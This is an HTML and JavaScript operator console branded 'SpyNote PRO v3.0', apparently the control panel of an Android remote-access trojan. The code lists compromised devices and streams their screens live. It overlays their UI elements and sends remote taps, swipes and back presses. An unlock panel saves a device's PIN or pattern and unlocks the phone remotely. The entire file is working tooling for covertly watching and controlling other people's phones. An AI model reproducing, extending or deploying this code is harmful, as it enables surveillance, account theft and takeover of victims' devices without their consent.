<!DOCTYPE html>
<html>
<head>
    <title>üîì SpyNote PRO v3.0 - Full Layout Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        
        #devices {
            position: fixed; top: 15px; left: 15px; z-index: 1000;
            background: rgba(0,0,0,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 300px; 
            border-radius: 16px; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
        }
        .device { 
            padding: 16px; margin: 10px 0; background: rgba(50,50,70,0.8); 
            cursor: pointer; border-radius: 12px; transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .device:hover { background: rgba(0,170,120,0.9); transform: translateX(8px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; }
        .disconnected { opacity: 0.4; }

        #phone-container {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: min(95vw, 450px); height: min(95vh, 900px); 
            background: #000; border-radius: 40px; 
            padding: 30px 25px; box-shadow: 0 30px 80px rgba(0,0,0,0.8);
            border: 3px solid rgba(255,255,255,0.1);
            touch-action: none;
        }
        
        #screen { 
            width: 100%; height: 100%; 
            border-radius: 25px; background: #111;
            image-rendering: optimizeSpeed; cursor: pointer;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
            position: relative;
        }

        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; background: transparent;
        }
        .ui-element {
            position: absolute; border: 1px solid rgba(0,255,136,0.4);
            background: rgba(0,255,136,0.1); border-radius: 4px;
            font-size: 10px; padding: 2px; backdrop-filter: blur(5px);
            transition: all 0.2s; cursor: pointer;
        }
        .ui-element:hover {
            border-color: #00ff88 !important; background: rgba(0,255,136,0.3) !important;
            box-shadow: 0 0 10px rgba(0,255,136,0.5);
        }
        .clickable { border-color: #ff6b6b !important; background: rgba(255,107,107,0.2) !important; }

        #status-bar {
            position: fixed; top: 15px; right: 15px; z-index: 1000;
            background: rgba(0,0,0,0.9); padding: 15px 20px; 
            border-radius: 12px; backdrop-filter: blur(20px); font-size: 13px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        #unlock-panel {
            position: fixed; top: 20px; right: 20px; z-index: 1001;
            background: rgba(0,0,0,0.95); padding: 20px; border-radius: 12px;
            backdrop-filter: blur(20px); border: 1px solid #ff6b6b; display: none;
        }
        #unlock-panel.active { display: block; }
        input { background: #333; color: white; border: 1px solid #555; padding: 8px; border-radius: 6px; width: 200px; }

        #controls {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 10px; z-index: 1000; flex-wrap: wrap;
        }
        button {
            padding: 12px 20px; background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; border-radius: 25px; cursor: pointer;
            font-size: 14px; font-weight: 600; transition: all 0.3s;
            box-shadow: 0 6px 20px rgba(102,126,234,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.6); }
        .unlock-btn { background: linear-gradient(45deg, #ff6b6b, #ee5a52) !important; }
        .layout-toggle { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 20px; color: #00ff88;">üîì Connected Devices</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Layout: <span id="layoutFps">0</span>Hz</div>
        <div>Device: <span id="selectedDevice">-</span> | Latency: <span id="latency">0ms</span></div>
    </div>

    <div id="unlock-panel">
        <h4 style="color: #ff6b6b; margin-bottom: 10px;">üîì Device Unlock</h4>
        <input id="unlockPattern" placeholder="pin:1234 or pattern:123456" />
        <br><br>
        <button class="unlock-btn" onclick="setUnlockPattern()">üíæ Save Pattern</button>
        <button class="unlock-btn" onclick="sendUnlock()">üöÄ Unlock Now</button>
    </div>

    <div id="phone-container">
        <canvas id="screen"></canvas>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="controls">
        <button onclick="toggleLayoutOverlay()">üìä Layout Toggle</button>
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="toggleFullScreen()">üì± Fullscreen</button>
        <button class="unlock-btn" onclick="toggleUnlockPanel()">üîì Unlock</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'], upgrade: false });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let frameCount = 0, layoutCount = 0, lastFrameTime = 0, lastLayoutTime = 0;
        let showLayout = true;
        let layoutData = [];
        let isDragging = false;
        let dragStart = { x: 0, y: 0 };

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const overlayCanvas = document.getElementById('layout-overlay');
        const overlayCtx = overlayCanvas.getContext('2d');
        const phoneContainer = document.getElementById('phone-container');
        const unlockPanel = document.getElementById('unlock-panel');

        socket.on('connect', () => {
            document.getElementById('connectionStatus').textContent = '‚úÖ Connected';
            document.getElementById('connectionStatus').style.color = '#00ff88';
            loadDevices();
        });

        socket.on('screen-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            const img = new Image();
            img.onload = () => {
                const rect = phoneContainer.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                overlayCanvas.width = rect.width;
                overlayCanvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, rect.width, rect.height);
                
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    document.getElementById('fps').textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    frameCount = 0; lastFrameTime = now;
                }
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        socket.on('layout-tree', (data) => {
            if (data.deviceId !== currentDevice) return;
            layoutData = data.layout;
            layoutCount++;
            const now = performance.now();
            if (now - lastLayoutTime >= 1000) {
                document.getElementById('layoutFps').textContent = Math.round(layoutCount * 1000 / (now - lastLayoutTime));
                layoutCount = 0; lastLayoutTime = now;
            }
            if (showLayout) renderLayoutOverlay();
        });

        function renderLayoutOverlay() {
            overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
            const rect = phoneContainer.getBoundingClientRect();
            
            layoutData.forEach((node, index) => {
                try {
                    const bounds = parseBounds(node.bounds);
                    if (!bounds) return;
                    
                    const x = ((bounds.left / deviceWidth) * rect.width);
                    const y = ((bounds.top / deviceHeight) * rect.height);
                    const w = ((bounds.right - bounds.left) / deviceWidth) * rect.width;
                    const h = ((bounds.bottom - bounds.top) / deviceHeight) * rect.height;
                    
                    if (w > 5 && h > 5) { // Minimum size filter
                        const el = document.createElement('div');
                        el.className = `ui-element ${node.clickable ? 'clickable' : ''}`;
                        el.style.left = x + 'px';
                        el.style.top = y + 'px';
                        el.style.width = w + 'px';
                        el.style.height = h + 'px';
                        el.title = `${node.text || node.contentDesc || ''}\n${node.className}`;
                        el.onclick = (e) => {
                            e.stopPropagation();
                            sendTap(bounds.left + bounds.width()/2, bounds.top + bounds.height()/2);
                        };
                        
                        // Add text if meaningful
                        if ((node.text && node.text.length > 0) || (node.contentDesc && node.contentDesc.length > 0)) {
                            el.textContent = (node.text || node.contentDesc || '').substring(0, 20);
                        }
                        
                        // Replace existing or append
                        const existing = document.querySelector(`[data-node="${index}"]`);
                        if (existing) existing.replaceWith(el);
                        else {
                            el.dataset.node = index;
                            document.getElementById('layout-overlay').appendChild(el);
                        }
                    }
                } catch (e) {}
            });
        }

        function parseBounds(boundsStr) {
            const match = boundsStr.match(/\[(-?\d+),(-?\d+)\]\[(-?\d+),(-?\d+)\]/);
            if (match) {
                return {
                    left: parseInt(match[1]), top: parseInt(match[2]),
                    right: parseInt(match[3]), bottom: parseInt(match[4]),
                    width: () => parseInt(match[3]) - parseInt(match[1]),
                    height: () => parseInt(match[4]) - parseInt(match[2])
                };
            }
            return null;
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneContainer.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Touch/Mouse Events
        phoneContainer.addEventListener('mousedown', startTouch);
        phoneContainer.addEventListener('mousemove', dragTouch);
        phoneContainer.addEventListener('mouseup', endTouch);
        phoneContainer.addEventListener('mouseleave', endTouch);
        phoneContainer.addEventListener('touchstart', startTouch, { passive: false });
        phoneContainer.addEventListener('touchmove', dragTouch, { passive: false });
        phoneContainer.addEventListener('touchend', endTouch, { passive: false });

        function startTouch(e) {
            e.preventDefault();
            isDragging = true;
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            dragStart = coords;
            sendTap(coords.x, coords.y);
        }

        function dragTouch(e) {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
        }

        function endTouch() { isDragging = false; }

        // UI Functions
        function toggleLayoutOverlay() {
            showLayout = !showLayout;
            const overlay = document.getElementById('layout-overlay');
            overlay.style.display = showLayout ? 'block' : 'none';
            if (showLayout) renderLayoutOverlay();
        }

        function toggleUnlockPanel() {
            unlockPanel.classList.toggle('active');
        }

        function setUnlockPattern() {
            const pattern = document.getElementById('unlockPattern').value;
            if (currentDevice && pattern) {
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'set_unlock', 
                    pattern 
                });
                alert('‚úÖ Unlock pattern saved!');
            }
        }

        function sendUnlock() {
            if (currentDevice) {
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'unlock' 
                });
            }
        }

        function loadDevices() {
            fetch('/devices').then(r => r.json()).then(updateDeviceList);
        }

        function updateDeviceList(devices) {
            document.getElementById('device-list').innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model?.slice(0,15) || id.slice(0,8)}...</b><br>
                        <small>${info.brand || 'Android'} ${info.version || ''}</small><br>
                        <small style="color: ${info.screenOffSupported ? '#00ff88' : '#ff6b6b'}">
                            ${info.screenOffSupported ? 'üñ•Ô∏è Layout' : 'üì± Visual'}
                        </small>
                        <div>${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}</div>
                    </div>
                `).join('') : '<div style="opacity:0.5;">No devices</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('selectedDevice').textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('select-device', { deviceId });
        }

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'swipe', startX: sx, startY: sy, endX: ex, endY: ey });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        socket.on('devices-update', updateDeviceList);
        socket.on('disconnect', () => {
            document.getElementById('connectionStatus').textContent = 'üîå Reconnecting...';
        });
    </script>
</body>
</html>
